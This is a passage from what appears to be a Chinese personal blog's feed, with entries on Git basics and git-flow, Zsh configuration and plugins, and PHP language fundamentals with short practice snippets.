&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;http://php.net/manual/zh/language.types.string.php&quot;&gt;String 字符串&lt;/a&gt;
&lt;a href=&quot;http://stackoverflow.com/questions/3264514/in-php-what-does-it-mean-by-a-function-being-binary-safe&quot;&gt;In PHP what does it mean by a function being binary-safe?&lt;/a&gt;
&lt;a href=&quot;http://weizhifeng.net/php-binary-safe.html&quot;&gt;PHP二进制安全&lt;/a&gt;
&lt;a href=&quot;http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html&quot;&gt;字符编码笔记：ASCII，Unicode和UTF-8&lt;/a&gt;
&lt;a href=&quot;http://php.net/manual/en/book.mbstring.php&quot;&gt;Multibyte String&lt;/a&gt;
&lt;a href=&quot;http://blog.ifeeline.com/1172.html&quot;&gt;PHP函数参考 – 国际化与字符编码支持 – iconv&lt;/a&gt;
&lt;a href=&quot;http://php.net/manual/zh/language.oop5.serialization.php&quot;&gt;对象序列化&lt;/a&gt;
&lt;a href=&quot;http://blog.csdn.net/lxcnn/article/details/4304651&quot;&gt;正则基础之——NFA引擎匹配原理&lt;/a&gt;
&lt;a href=&quot;http://progressdaily.diandian.com/post/how-regex-work&quot;&gt;正则表达式原理&lt;/a&gt;
&lt;a href=&quot;http://www.cnblogs.com/hustskyking/archive/2013/06/04/RegExp.html&quot;&gt;正则表达式30分钟入门教程&lt;/a&gt;
&lt;a href=&quot;http://segmentfault.com/blog/barretlee/1190000000426455&quot;&gt;进阶正则表达式&lt;/a&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Git使用指南</title>
   <link href="http://yanpeipan.github.io/2014/12/06/git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97.html"/>
   <updated>2014-12-06T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2014/12/06/git使用指南</id>
   <content type="html">
&lt;hr /&gt;

&lt;h1 id=&quot;为何是git&quot;&gt;为何是Git&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;对于Git与其他集中式代码管理工具相比的优缺点的全面讨论，请参见&lt;a href=&quot;https://git.wiki.kernel.org/index.php/GitSvnComparsion&quot;&gt;这里&lt;/a&gt;。这样的争论总是喋喋不休。作为一个开发者，与现今的其他开发工具相比较，我更喜欢Git。Git真得改变了开发者对于合并和分支的思考。我曾经使用经典的CVS/Subversion，然而每次的合并/分支和其他行为总让人担惊受怕（“小心合并里的冲突，简直要命！”）。
但是对于Git来说，这些行为非常简单和搞笑，它们被认为是日常工作中的核心部分。例如，在很多CVS/Subversion书里，分支与合并总是在后面的章节中被讨论（对于高级用户使用），然而在每个Git&lt;a href=&quot;https://pragprog.com/book/tsgit/pragmatic-version-control-using-git&quot;&gt;书&lt;/a&gt;中，在第3章就已经完全涵盖了（作为基础）。
简单和重复的特性带来的结果是：分支与合并不再是什么可以害怕的东西。分支/合并被认为对于版本管理工具比其他功能更重要。
关于工具，不再多说，让我们直接看开发模型吧。这个模型并不是如下模型：在管理软件开发进度方面，面对每个开发过程，每个队员必须按一定次序开发。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;初次运行-git-前的配置&quot;&gt;初次运行 Git 前的配置&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;$ git config --global user.name &quot;John Doe&quot;
$ git config --global user.email johndoe@example.com
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;更多信息可以参考：&lt;a href=&quot;http://git-scm.com/book/zh/v1/%E8%B5%B7%E6%AD%A5-%E5%88%9D%E6%AC%A1%E8%BF%90%E8%A1%8C-Git-%E5%89%8D%E7%9A%84%E9%85%8D%E7%BD%AE&quot;&gt;Git 起步&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;快速开始&quot;&gt;快速开始&lt;/h1&gt;

&lt;h2 id=&quot;将本地项目inmi-推送到httpluxtonered16com88inmigit&quot;&gt;将本地项目&lt;code&gt;Inmi&lt;/code&gt;, 推送到&lt;code&gt;http://luxtone.red16.com:88/inmi.git&lt;/code&gt;&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;git init
git add *
git commit -m &quot;&quot; --allow-empty-message
git remote add origin http://luxtone.red16.com:88/inmi.git
git push -u origin master
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;如果在inmi文件夹中已经创建本地仓库&quot;&gt;如果在&lt;code&gt;Inmi&lt;/code&gt;文件夹中已经创建本地仓库&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;git remote add origin http://luxtone.red16.com:88/inmi.git
git push -u origin master
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;常见问题&quot;&gt;常见问题&lt;/h1&gt;

&lt;h2 id=&quot;忽略某些文件&quot;&gt;忽略某些文件&lt;/h2&gt;

&lt;p&gt;在工作根目录中添加一个叫&lt;code&gt;.gitignore&lt;/code&gt;的文件，来告诉Git系统要忽略 掉哪些文件，下面是文件内容的示例:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# 以'#' 开始的行，被视为注释.
# 忽略掉所有文件名是 foo.txt 的文件.
foo.txt
# 忽略所有生成的 html 文件,
*.html
# foo.html是手工维护的，所以例外.
!foo.html
#  忽略所有.o 和 .a文件.
*.[oa]
#  忽略.svn目录
.svn
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;添加空目录&quot;&gt;添加空目录&lt;/h2&gt;

&lt;p&gt;Git 和 SVN 不同，仅仅跟踪文件的变动，不跟踪目录。可以在空目录下添加一个空文件， 常用&lt;code&gt;.gitignore&lt;/code&gt; 或者 &lt;code&gt;.gitkeep&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;find . -type d -empty -exec touch {}/.gitignore \;&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;从svn导入&quot;&gt;从SVN导入&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;clone-url&lt;/code&gt;替换为真实SVN地址&lt;/p&gt;

&lt;p&gt;&lt;code&gt;git svn clone clone-url&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;git-flow-一个成功的git分支模型&quot;&gt;git-flow 一个成功的Git分支模型&lt;/h1&gt;
&lt;p&gt;git-flow 是一个 git 扩展集，按 Vincent Driessen 的分支模型提供高层次的库操作。 &lt;a href=&quot;http://nvie.com/posts/a-successful-git-branching-model/&quot;&gt;查看详情&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;特性&quot;&gt;特性&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;为即将发布的版本开发新功能特性。&lt;/li&gt;
  &lt;li&gt;这通常只存在开发者的库中。&lt;/li&gt;
  &lt;li&gt;新特性的开发是基于 &lt;code&gt;develop&lt;/code&gt; 分支的。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;release版本&quot;&gt;release版本&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;支持一个新的用于生产环境的发布版本。&lt;/li&gt;
  &lt;li&gt;允许修正小问题，并为发布版本准备元数据。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;热点&quot;&gt;热点&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;热点修复来自这样的需求：生产环境的版本处于一个不预期状态，需要立即修正。&lt;/li&gt;
  &lt;li&gt;有可能是需要修正 master 分支上某个 TAG 标记的生产版本。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;git-flow命令&quot;&gt;git-flow命令&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/image/git-flow-commands.png&quot; alt=&quot;Git-flow commands&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;topgit&quot;&gt;TopGit&lt;/h1&gt;

&lt;p&gt;TopGit aims to make handling of large amounts of interdependent topic
branches easier.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;参考资料&quot;&gt;参考资料&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://learngitbranching.js.org/&quot;&gt;Learn Git Branching&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.bootcss.com/p/git-guide/&quot;&gt;git - 简易指南&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000&quot;&gt;Git教程&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://danielkummer.github.io/git-flow-cheatsheet/index.zh_CN.html&quot;&gt;git-flow 备忘清单&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.juvenxu.com/2010/11/28/a-successful-git-branching-model/&quot;&gt;一个成功的Git分支模型&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://nvie.com/posts/a-successful-git-branching-model/&quot;&gt;A successful Git branching model&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://git-scm.com/book/zh/v1&quot;&gt;Pro Git&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://git-scm.com/doc&quot;&gt;git –fast-version-control&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://help.github.com/&quot;&gt;GitHub Help&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/greenrd/topgit&quot;&gt;TopGit - A different patch queue manager&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://haacked.com/archive/2014/07/28/github-flow-aliases/&quot;&gt;GitHub Flow Like a Pro with these 13 Git Aliases&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>Zsh</title>
   <link href="http://yanpeipan.github.io/2014/11/27/zsh.html"/>
   <updated>2014-11-27T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2014/11/27/zsh</id>
   <content type="html">
&lt;blockquote&gt;
  &lt;p&gt;Z shell（Zsh）是一款可用作交互式登录的shell及脚本编写的命令解释器。Zsh对Bourne shell做出了大量改进，同时加入了Bash、ksh及tcsh的某些功能。(引用自维基百科)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;安装&quot;&gt;安装&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code&gt;brew install zsh zsh-completions&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;oh-my-zsh&quot;&gt;Oh My ZSH&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;oh my zsh是一个管理Zsh配置的框架，捆绑了很多使用的功能、助手工具、插件、主题等。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;参数配置&quot;&gt;参数配置&lt;/h1&gt;

&lt;h2 id=&quot;history&quot;&gt;History&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt; export HISTSIZE=2000 # 改变历史纪录大小
 setopt HIST_FIND_NO_DUPS # 搜索结果去重
 setopt HIST_IGNORE_ALL_DUPS # 纪录去重，新纪录替换旧纪录
 setopt HIST_IGNORE_SPACE # 忽略以空格开头命令，如果想让它立刻消失，输入：空格并换行
 setopt INC_APPEND_HISTORY # 以追加方式增加历史纪录
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;配置完成后，最好使用&lt;code&gt;histroy -c&lt;/code&gt;清空历史纪录，让History重新纪录。也可以手动清除&lt;code&gt;sort -t &quot;;&quot; -k 2 -u ~/.zsh_history | sort -o ~/.zsh_history&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;更多配置&quot;&gt;更多配置&lt;/h2&gt;

&lt;p&gt;http://zsh.sourceforge.net/Doc/Release/Options.html&lt;/p&gt;

&lt;h1 id=&quot;主题&quot;&gt;主题&lt;/h1&gt;

&lt;h2 id=&quot;dracula-theme&quot;&gt;Dracula Theme&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;吸血鬼主题&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;插件&quot;&gt;插件&lt;/h1&gt;

&lt;h2 id=&quot;fzf&quot;&gt;fzf&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;模糊搜索神器&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code&gt;brew install fzf
/usr/local/opt/fzf/install
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;zsh-autosuggestions&quot;&gt;zsh-autosuggestions&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;brew install zsh-syntax-highlighting
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;zsh-completions&quot;&gt;zsh-completions&lt;/h2&gt;

&lt;h2 id=&quot;autojump&quot;&gt;autojump&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;brew install autojump
[ -f /usr/local/etc/profile.d/autojump.sh ] &amp;amp;&amp;amp; . /usr/local/etc/profile.d/autojump.sh
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;zsh-syntax-highlighting&quot;&gt;zsh-syntax-highlighting&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;Fish shell-like syntax highlighting for Zsh.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code&gt;brew install zsh-syntax-highlighting
&lt;/code&gt;&lt;/pre&gt;
</content>
 </entry>
 
 <entry>
   <title>PHP</title>
   <link href="http://yanpeipan.github.io/2014/11/27/php.html"/>
   <updated>2014-11-27T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2014/11/27/php</id>
   <content type="html">
&lt;hr /&gt;

&lt;h1 id=&quot;php-是什么&quot;&gt;PHP 是什么？&lt;/h1&gt;
&lt;p&gt;PHP原始为&lt;code&gt;Personal Home Page&lt;/code&gt;的缩写,已经正式更名为 &lt;code&gt;PHP: Hypertext Preprocessor&lt;/code&gt;（超文本预处理器的字母缩写）
PHP是一种被广泛应用的开放源代码的多用途脚本语言，它可嵌入到 HTML中，尤其适合 web 开发。
PHP 脚本主要用于以下三个领域：服务端脚本，命令行脚本，编写桌面应用程序&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;语言参考&quot;&gt;&lt;strong&gt;语言参考&lt;/strong&gt;&lt;/h1&gt;

&lt;h2 id=&quot;数据类型&quot;&gt;数据类型&lt;/h2&gt;
&lt;p&gt;四种标量类型：&lt;code&gt;string&lt;/code&gt; &lt;code&gt;integer&lt;/code&gt; &lt;code&gt;float&lt;/code&gt; &lt;code&gt;boolean&lt;/code&gt;
两种复合类型：&lt;code&gt;array&lt;/code&gt; &lt;code&gt;object&lt;/code&gt;
两种特殊类型：&lt;code&gt;resource&lt;/code&gt; &lt;code&gt;NULL&lt;/code&gt;
回调类型: &lt;code&gt;callback&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;数据类型转换&quot;&gt;数据类型转换&lt;/h3&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;自动类型转换&lt;/strong&gt;
PHP 在变量定义中不需要（或不支持）明确的类型定义；变量类型是根据使用该变量的上下文所决定的。也就是说，如果把一个 &lt;code&gt;string&lt;/code&gt; 值赋给变量 &lt;code&gt;$var&lt;/code&gt;，&lt;code&gt;$var&lt;/code&gt; 就成了一个 &lt;code&gt;string&lt;/code&gt;。如果又把一个&lt;code&gt;integer&lt;/code&gt; 赋给 &lt;code&gt;$var&lt;/code&gt;，那它就成了一个&lt;code&gt;integer&lt;/code&gt;。
PHP 的自动类型转换的一个例子是加法运算符&lt;code&gt;+&lt;/code&gt;。如果任何一个操作数是&lt;code&gt;float&lt;/code&gt;，则所有的操作数都被当成&lt;code&gt;float&lt;/code&gt;，结果也是&lt;code&gt;float&lt;/code&gt;。否则操作数会被解释为&lt;code&gt;integer&lt;/code&gt;，结果也是&lt;code&gt;integer&lt;/code&gt;。注意这并没有改变这些操作数本身的类型；改变的仅是这些操作数如何被求值以及表达式本身的类型。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;强制类型转换&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;code&gt;(int)&lt;/code&gt; &lt;code&gt;(integer)&lt;/code&gt; - 转换为整形 &lt;code&gt;integer&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code&gt;(bool)&lt;/code&gt; &lt;code&gt;(boolean)&lt;/code&gt; - 转换为布尔类型 &lt;code&gt;boolean&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code&gt;(float)&lt;/code&gt; &lt;code&gt;(double)&lt;/code&gt; &lt;code&gt;(real)&lt;/code&gt; - 转换为浮点型 &lt;code&gt;float&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code&gt;(string)&lt;/code&gt; - 转换为字符串 &lt;code&gt;string&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code&gt;(array)&lt;/code&gt; - 转换为数组 &lt;code&gt;array&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code&gt;(object)&lt;/code&gt; - 转换为对象 &lt;code&gt;object&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code&gt;(unset)&lt;/code&gt; - 转换为 &lt;code&gt;NULL&lt;/code&gt; (PHP 5)&lt;/li&gt;
      &lt;li&gt;&lt;code&gt;(binary)&lt;/code&gt; &lt;code&gt;b&quot;string&quot;&lt;/code&gt; - 换为二进制字符串&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;魔术常量&quot;&gt;魔术常量&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;__LINE__&lt;/code&gt;   文件中的当前行号。
&lt;code&gt;__FILE__&lt;/code&gt;   文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。自 PHP 4.0.2 起，&lt;code&gt;__FILE__&lt;/code&gt; 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路径），而在此之前的版本有时会包含一个相对路径。
&lt;code&gt;__DIR__&lt;/code&gt;  文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 &lt;code&gt;dirname(__FILE__)&lt;/code&gt;。除非是根目录，否则目录中名不包括末尾的斜杠。（PHP 5.3.0中新增）
&lt;code&gt;__FUNCTION__&lt;/code&gt;   函数名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该函数被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。
&lt;code&gt;__CLASS__&lt;/code&gt;  类的名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该类被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。类名包括其被声明的作用区域（例如 &lt;code&gt;Foo\Bar&lt;/code&gt;）。注意自 PHP 5.4 起 &lt;code&gt;__CLASS__&lt;/code&gt; 对 trait 也起作用。当用在 trait 方法中时，&lt;code&gt;__CLASS__&lt;/code&gt; 是调用 trait 方法的类的名字。
&lt;code&gt;__TRAIT__&lt;/code&gt;  Trait 的名字（PHP 5.4.0 新加）。自 PHP 5.4 起此常量返回 trait 被定义时的名字（区分大小写）。Trait 名包括其被声明的作用区域（例如 &lt;code&gt;Foo\Bar&lt;/code&gt;）。
&lt;code&gt;__METHOD__&lt;/code&gt;   类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。
&lt;code&gt;__NAMESPACE__&lt;/code&gt;  当前命名空间的名称（区分大小写）。此常量是在编译时定义的（PHP 5.3.0 新增）。&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;魔术方法&quot;&gt;魔术方法&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;__construct()&lt;/code&gt;
&lt;code&gt;__destruct()&lt;/code&gt;
&lt;code&gt;__call()&lt;/code&gt;
&lt;code&gt;__callStatic()&lt;/code&gt;
&lt;code&gt;__get()&lt;/code&gt;
&lt;code&gt;__set()&lt;/code&gt;
&lt;code&gt;__isset()&lt;/code&gt;
&lt;code&gt;__unset()&lt;/code&gt;
&lt;code&gt;__sleep()&lt;/code&gt;
&lt;code&gt;__wakeup()&lt;/code&gt;
&lt;code&gt;__toString()&lt;/code&gt;
&lt;code&gt;__invoke()&lt;/code&gt;
&lt;code&gt;__set_state()&lt;/code&gt;
&lt;code&gt;__clone()&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;全局环境变量&quot;&gt;全局环境变量&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;超全局变量&lt;/code&gt; — 超全局变量是在全部作用域中始终可用的内置变量
&lt;code&gt;$GLOBALS&lt;/code&gt; — 引用全局作用域中可用的全部变量
&lt;code&gt;$_SERVER&lt;/code&gt; — 服务器和执行环境信息
&lt;code&gt;$_GET&lt;/code&gt; — HTTP GET 变量
&lt;code&gt;$_POST&lt;/code&gt; — HTTP POST 变量
&lt;code&gt;$_FILES&lt;/code&gt; — HTTP 文件上传变量
&lt;code&gt;$_REQUEST&lt;/code&gt; — HTTP Request 变量
&lt;code&gt;$_SESSION&lt;/code&gt; — Session 变量
&lt;code&gt;$_ENV&lt;/code&gt; — 环境变量
&lt;code&gt;$_COOKIE&lt;/code&gt; — HTTP Cookies
&lt;code&gt;$php_errormsg&lt;/code&gt; — 前一个错误信息
&lt;code&gt;$HTTP_RAW_POST_DATA&lt;/code&gt; — 原生POST数据
&lt;code&gt;$http_response_header&lt;/code&gt; — HTTP 响应头
&lt;code&gt;$argc&lt;/code&gt; — 传递给脚本的参数数目
&lt;code&gt;$argv&lt;/code&gt; — 传递给脚本的参数数组&lt;/p&gt;

&lt;h2 id=&quot;表达式&quot;&gt;表达式&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;gettype( PHP_INT_MAX + 1 );
function_exists('print');
(int) ( ( 0.1 + 0.7) * 10 );
is_nan( acos( 8 ) );
( bool )'0';
false || true;
array( 1 =&amp;gt; &quot;a&quot;, &quot;1&quot;  =&amp;gt; &quot;b&quot;, 1.5  =&amp;gt; &quot;c&quot;, true =&amp;gt; &quot;d&quot; );
array( &quot;a&quot;, &quot;b&quot;, 6 =&amp;gt; &quot;c&quot;, &quot;d&quot; );
count( 'string' );
count( null );
$null = null; isset( $null );
$object = (object) 'string'; $object-&amp;gt;scalar;
8 % ( -2 );
$srcArr = array( 'a', 'b', 'c', 'd' ); is_string( array_rand( $srcArr ) );
$a = 1; function sum(){ echo $a;} sum();
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;a href=&quot;http://cn2.php.net/manual/zh/function.count.php#refsect1-function.count-returnvalues&quot;&gt;count 返回值 ¶&lt;/a&gt;
&lt;a href=&quot;http://www.php.net/manual/zh/function.isset.php#refsect1-function.isset-description&quot;&gt;isset 说明 ¶&lt;/a&gt;
&lt;a href=&quot;http://www.php.net/manual/zh/language.types.object.php#language.types.object.casting&quot;&gt;转换为对象 ¶&lt;/a&gt;
你可能注意到 PHP 的全局变量和 C 语言有一点点不同，在 C 语言中，全局变量在函数中自动生效，除非被局部变量覆盖。这可能引起一些问题，有些人可能不小心就改变了一个全局变量。PHP 中全局变量在函数中使用时必须声明为 global。
&lt;a href=&quot;http://php.net/manual/zh/language.variables.scope.php&quot;&gt;变量范围 ¶&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h4 id=&quot;不借助额外变量交换两个变量的值&quot;&gt;不借助额外变量，交换两个变量的值&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;$a = $a - $b;
$b = $b + $a;
$a = $b - $a;   /* 优点：运算简单 ；缺点：只支持整形，存在溢出问题（精度丢失） */

$a = $a ^ $b;
$b = $b ^ $a;
$a = $a ^ $b;  /* 优点：运算简单 ，不纯在溢出问题；缺点：字符串长度相同时才能正确交换，若是两个数值相同的数 就不能交换 */

$a .= $b;
$b = substr($a, 0, ( strlen($a) - strlen($b) ) );
$a = substr($a, strlen($b) );   /* 优点：支持字符串和整形，以及格式化的数组，对象等，不存在溢出问题 */

$a .= $b;
$b = str_replace( $b, &quot;&quot;, $a );
$a = str_replace( $b, &quot;&quot;, $a );  /* 字符串改进版 */

list($var1, $var2) = array($var2, $var1);  /* 优点：通用 */
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;用最少的代码写3值最大值的函数&quot;&gt;用最少的代码写3值最大值的函数&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;function () {
  return max(func_get_args());
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;echoprintprint_r的区别&quot;&gt;echo,print,print_r的区别&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;void echo ( string $arg1 [, string $… ] )&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;echo 不是一个函数（它是一个语言结构）， 因此你不一定要使用小括号来指明参数，单引号，双引号都可以。 echo （不像其他语言构造）不表现得像一个函数， 所以不能总是使用一个函数的上下文。 另外，如果你想给echo 传递多个参数， 那么就不能使用小括号。
没有返回值。&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;int print ( string $arg )&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;print 实际上不是一个函数（它是一个语言结构），因此你可以不必使用圆括号来括起它的参数列表。总是返回 1。&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;bool print_r ( mixed $expression [, bool $return ] )&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;print_r() 显示关于一个变量的易于理解的信息。如果给出的是 string、integer 或 float，将打印变量值本身。如果给出的是 array，将会按照一定格式显示键和元素。object 与数组类似。print_r() 将把数组的指针移到最后边。使用 reset() 可让指针回到开始处。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#语言结构/函数,参数,返回值
echo $a, $b, PHP_EOL;
print $a . $b . PHP_EOL;
print_r(array($a,$b,PHP_EOL), true);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;如何实现字符串翻转&quot;&gt;如何实现字符串翻转&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;strrev($s); // 中文乱码

preg_match_all('/./u', $s, $match);
implode('', array_reverse($match[0]));

$length = mb_strlen($s);
$r = '';
while($length) {
  $r .= mb_substr($s, --$length, 1, 'utf-8');
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;翻转字符串中的单词字符串仅包含大小写字母和空格单词使用空格分割如输入this-is-php输出php-is-this&quot;&gt;翻转字符串中的单词,字符串仅包含大小写字母和空格,单词使用空格分割.如:输入”This is PHP”,输出”PHP is This”&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;implode(' ', array_reverse(explode(' ', $s)));
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;将1234567890转换成1234567890每3位用逗号隔开的形式&quot;&gt;将1234567890转换成1,234,567,890每3位用逗号隔开的形式&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;strrev(implode(',', str_split(strrev($n), 3)));

number_format($n);

ltrim(strrev(chunk_split(strrev($n), 3, ',')), ',');

preg_replace('/(?&amp;lt;=\d{3})(\d{3})/',', $1', preg_replace('/^(\d{1,3})((\d{3})+)$/','$1,$2',$n));
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;php-的命令行模式-&quot;&gt;PHP 的命令行模式 ¶&lt;/h4&gt;
&lt;p&gt;从版本 4.3.0 开始，PHP 提供了一种新类型的 CLI SAPI（Server Application Programming Interface，服务端应用编程端口）支持，名为 CLI，意为 Command Line Interface，即命令行接口。顾名思义，该 CLI SAPI 模块主要用作 PHP 的开发外壳应用。CLI SAPI 和其它 CLI SAPI 模块相比有很多的不同之处，我们将在本章中详细阐述。值得一提的是，CLI 和 CGI 是不同的 SAPI，尽管它们之间有很多共同的行为。&lt;/p&gt;

&lt;p&gt;以下为 CLI SAPI 和其它 CLI SAPI 模块相比的显著区别：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;与 CGI SAPI 不同，其输出没有任何头信息。
尽管 CGI SAPI 提供了取消 HTTP 头信息的方法，但在 CLI SAPI 中并不存在类似的方法以开启 HTTP 头信息的输出。
CLI 默认以安静模式开始，但为了保证兼容性，-q 和 –no-header 参数为了向后兼容仍然保留，使得可以使用旧的 CGI 脚本。
在运行时，不会把工作目录改为脚本的当前目录（可以使用 -C 和 –no-chdir 参数来兼容 CGI 模式）。
出错时输出纯文本的错误信息（非 HTML 格式）。&lt;/li&gt;
  &lt;li&gt;CLI SAPI 强制覆盖了 php.ini 中的某些设置，因为这些设置在外壳环境下是没有意义的。&lt;/li&gt;
  &lt;li&gt;为了减轻外壳环境下的工作，我们定义了CLI 专用常量：STDIN, STDOUT, STDERR&lt;/li&gt;
  &lt;li&gt;CLI SAPI 不会将当前目录改为已运行的脚本所在的目录。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CLI SAPI 模块有以下三种不同的方法来获取要运行的 PHP 代码：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;让 PHP 运行指定文件 : php -f my_script.php&lt;/li&gt;
  &lt;li&gt;在命令行直接运行 PHP 代码 : php -r ‘print_r(get_defined_constants());’&lt;/li&gt;
  &lt;li&gt;
    &lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;通过标准输入（stdin）提供需要运行的 PHP 代码 : some_application&lt;/td&gt;
          &lt;td&gt;some_filter&lt;/td&gt;
          &lt;td&gt;php&lt;/td&gt;
          &lt;td&gt;sort -u &amp;gt;final_output.txt&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
